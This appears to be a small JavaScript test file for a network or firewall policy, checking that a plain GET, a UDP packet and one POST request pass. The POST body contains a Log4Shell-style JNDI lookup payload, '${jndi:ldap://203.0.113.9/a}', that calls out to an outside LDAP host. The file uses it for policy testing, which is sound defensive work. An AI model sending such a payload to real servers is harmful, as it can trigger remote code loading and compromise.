export const port = 80;

export default function ({ f, run, get, post }) {
  run(f, "a GET", get("/"), "pass", { dport: port });
  run(f, "a request another policy would reset", post("/roller-services/xmlrpc", "", "${jndi:ldap://203.0.113.9/a}"), "pass", { dport: 8080 });
  run(f, "UDP", "\x00\x01", "pass", { dport: 53, proto: 17 });
}
